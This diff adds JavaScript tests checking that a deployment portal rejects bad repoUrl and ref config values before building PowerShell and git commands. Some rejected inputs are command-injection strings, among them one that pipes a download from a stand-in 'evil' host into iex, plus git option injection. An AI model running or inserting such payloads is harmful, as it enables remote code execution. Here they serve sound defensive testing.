@@ -872,3 +872,23 @@ test('state: rotation done -> delete the old devices by hand; roll back means ro
   assert.match(r.actions[1].title, /rotation is complete/);
   assert.match(last(r.actions[1].command), / -Rollback$/);
 });
+
+test('published copy: portal-config.js values are validated before they reach a command (decision 0017)', () => {
+  assert.deepEqual(P.siteConfig({ repoUrl: 'https://github.com/contoso/avd-landing-zone/', ref: 'v1.2.0' }), { repoUrl: 'https://github.com/contoso/avd-landing-zone', ref: 'v1.2.0', ignored: [] });
+  assert.deepEqual(P.siteConfig(undefined), { repoUrl: null, ref: null, ignored: [] });
+  for (const bad of ['https://github.com/x/y; irm https://evil | iex', 'https://evil.example/x/y', 'https://github.com/x/../y', 'https://github.com/x/y/z', 'git@github.com:x/y', 42])
+    assert.deepEqual(P.siteConfig({ repoUrl: bad }).ignored, ['repoUrl'], String(bad));
+  for (const bad of ['--upload-pack=x', "v1'; iex x", 'a..b', 'v1 ', '-b', 'x.lock', 'a//b', ''])
+    assert.deepEqual(P.siteConfig({ ref: bad }).ignored, ['ref'], bad);
+});
+
+test('published copy: commands point an existing clone at the pinned repo and check out the ref; without one they follow master', () => {
+  const base = { location: 'eastus2', namePrefix: 'avdlz', environment: 'dev', parameterFile: 'parameters/dev.bicepparam' };
+  const pinned = P.actionsForStep('predeploy', Object.assign({}, base, { repoUrl: 'https://github.com/contoso/avd-landing-zone', ref: 'v1.2.0' }))[0].command;
+  assert.match(pinned, /^if \(-not \(Test-Path ~\/avd-landing-zone\)\) \{ git clone https:\/\/github\.com\/contoso\/avd-landing-zone\.git ~\/avd-landing-zone \}\nSet-Location ~\/avd-landing-zone; git remote set-url origin https:\/\/github\.com\/contoso\/avd-landing-zone\.git; git fetch -q --tags origin; git checkout -q 'v1\.2\.0'\n/);
+  assert.doesNotMatch(pinned, /git pull/);
+  const master = P.actionsForStep('predeploy', Object.assign({}, base, { repoUrl: P.DEFAULTS.repoUrl }))[0].command;
+  assert.match(master, /git checkout -q master; git pull -q --ff-only/);
+  // An invalid ref (from anywhere) never reaches the command.
+  assert.match(P.actionsForStep('predeploy', Object.assign({}, base, { repoUrl: P.DEFAULTS.repoUrl, ref: "x'; iex y" }))[0].command, /git checkout -q master/);
+});
